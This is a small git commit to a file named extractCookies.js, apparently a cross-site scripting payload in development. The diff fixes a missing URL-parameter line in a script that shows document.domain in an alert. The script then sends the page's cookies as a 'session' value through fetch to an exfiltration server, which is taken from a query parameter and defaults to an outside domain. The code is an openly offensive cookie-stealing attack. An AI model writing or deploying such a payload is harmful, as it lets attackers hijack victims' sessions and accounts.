43c7138dee819115cf86acd554c7744bec45c8e5
g6g <gaetan.guibaud@gmail.com>
2026-07-03 12:39:45 +0200

    oops

--- extractCookies.js
+++ extractCookies.js
@@ -1,6 +1,7 @@
 function main(){
 
     alert(document.domain)
+    const urlParams = new URLSearchParams(window.location.search);
     let serverOut = urlParams.get("serverOut")?? "//o.g6g.fr";
     if (!!serverOut){
         fetch(`${serverOut}?session=${encodeURIComponent(document.cookies)}`);
